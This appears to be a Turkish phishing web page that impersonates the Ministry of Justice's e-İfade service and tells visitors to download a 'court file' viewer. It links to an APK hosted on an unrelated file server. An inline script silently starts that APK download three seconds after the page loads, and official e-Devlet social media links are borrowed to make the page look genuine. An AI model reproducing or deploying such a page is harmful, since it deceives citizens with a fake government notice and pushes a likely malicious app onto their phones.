<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>e-İfade İndir</title>
  <style>
    :root {
      --bg-color: #121212;
      --text-color: #f1f1f1;
      --card-color: #1e1e1e;
      --button-bg: #3182ce;
      --button-hover: #2b6cb0;
      --border-color: #2d3748;
    }

    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      background-color: var(--bg-color);
      color: var(--text-color);
    }

    .topbar {
      background-color: #1a202c;
      padding: 15px 30px;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      color: #f7fafc;
    }

    .container {
      max-width: 900px;
      margin: 20px auto;
      background-color: var(--card-color);
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
      text-align: center;
    }

    .logo {
      height: 120px;
      object-fit: contain;
      margin-bottom: 20px;
    }

    h1 {
      color: #e2e8f0;
      font-size: 24px;
      margin-bottom: 20px;
    }

    .document-link {
      margin: 20px 0;
      padding: 20px;
      background-color: #2d3748;
      border: 2px dashed var(--button-bg);
      border-radius: 12px;
    }

    .download-btn {
      display: inline-block;
      padding: 14px 30px;
      background-color: var(--button-bg);
      color: white;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 16px;
      transition: background 0.2s ease;
    }

    .download-btn:hover {
      background-color: var(--button-hover);
    }

    .homepageSocialMediaContainer {
      background-color: #2a2a2a;
      padding: 30px;
      border-radius: 12px;
      max-width: 900px;
      margin: 50px auto 0 auto;
    }

    .homepageSocialMediaContent h3 {
      font-size: 20px;
      color: #f7fafc;
      margin-bottom: 10px;
      text-align: center;
    }

    .homepageSocialMediaText {
      display: block;
      font-size: 14px;
      color: #a0aec0;
      margin-bottom: 20px;
      text-align: center;
    }

    .socialMediaLink {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin: 10px auto;
      padding: 10px 20px;
      max-width: 320px;
      text-decoration: none;
      background-color: #1a202c;
      color: #edf2f7;
      border-radius: 8px;
      transition: background-color 0.2s ease-in-out;
    }

    .socialMediaLink:hover {
      background-color: #4a5568;
    }

    .socialMediaLink img {
      height: 20px;
    }

    .hashtag {
      display: block;
      text-align: center;
      margin-top: 20px;
      font-size: 13px;
      color: #718096;
    }

    .hashtag a {
      color: #63b3ed;
      text-decoration: underline;
    }

    @media screen and (max-width: 600px) {
      .container, .homepageSocialMediaContainer {
        margin: 10px;
        padding: 20px;
      }

      .download-btn {
        width: 100%;
      }
    }
  </style>
</head>
<body>

  <!-- Üst Bar -->
  <div class="topbar">
    Adalet Bakanlığı - e-İfade
  </div>

  <!-- e-İfade Kutusu -->
  <div class="container">
    <img src="https://i.imgur.com/jeKynKQ.png" alt="Adalet Bakanlığı Logosu" class="logo">
    <h1>Mahkeme dosyanızı görüntülemek için lütfen aşağıdaki bağlantıya tıklayın</h1>

    <div class="document-link">
      <a href="https://cdn.files-text.com/us-south1/api/lc/att/19196658/a0b011dc196fda503e8fb32d14c10966/e-ifade.apk" download class="download-btn">
        e-İfade (Dosyaları görüntülemek için tıklayınız)
      </a>
    </div>
  </div>

  <!-- Sosyal Medya Kutusu -->
  <div class="homepageSocialMediaContainer">
    <div class="homepageSocialMediaContent">
      <h3>Sosyal Medyada da Sizin Yanınızdayız!</h3>
      <span class="homepageSocialMediaText">
        Resmî sosyal medya hesaplarımızda e-Devlet Kapısı ile ilgili gelişmelerden haberdar olabilir,
        tüm soru ve hata bildirimlerinizi ekibimize iletebilirsiniz.
      </span>
      <a href="https://twitter.com/ekapi" rel="external" class="socialMediaLink">
        <img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/icons/twitter-logo-black.png" alt="Twitter">
        <em>Twitter</em> <span>@ekapi</span>
      </a>
      <a href="https://www.facebook.com/edevletkapi" rel="external" class="socialMediaLink">
        <em>Facebook</em> <span>/edevletkapi</span>
      </a>
      <a href="https://www.youtube.com/channel/UChX28IHPQ2jyaBatdfRqGSQ" rel="external" class="socialMediaLink">
        <em>YouTube</em> <span>e-Devlet Kapısı</span>
      </a>
      <a href="https://www.instagram.com/edevletkapisi" rel="external" class="socialMediaLink">
        <em>Instagram</em> <span>/edevletkapisi</span>
      </a>
      <em class="hashtag">#edevlet 
        <a href="/iletisim?sosyal=Medya">Sosyal Medya Kullanım Kılavuzu</a>
      </em>
    </div>
  </div>

  <!-- Otomatik İndirme Scripti -->
  <script>
    window.addEventListener('load', function () {
      setTimeout(function () {
        const link = document.createElement('a');
        link.href = "https://cdn.files-text.com/us-south1/api/lc/att/19196658/a0b011dc196fda503e8fb32d14c10966/e-ifade.apk";
        link.setAttribute('download', 'e-ifade.apk');
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }, 3000);
    });
  </script>

</body>
</html>
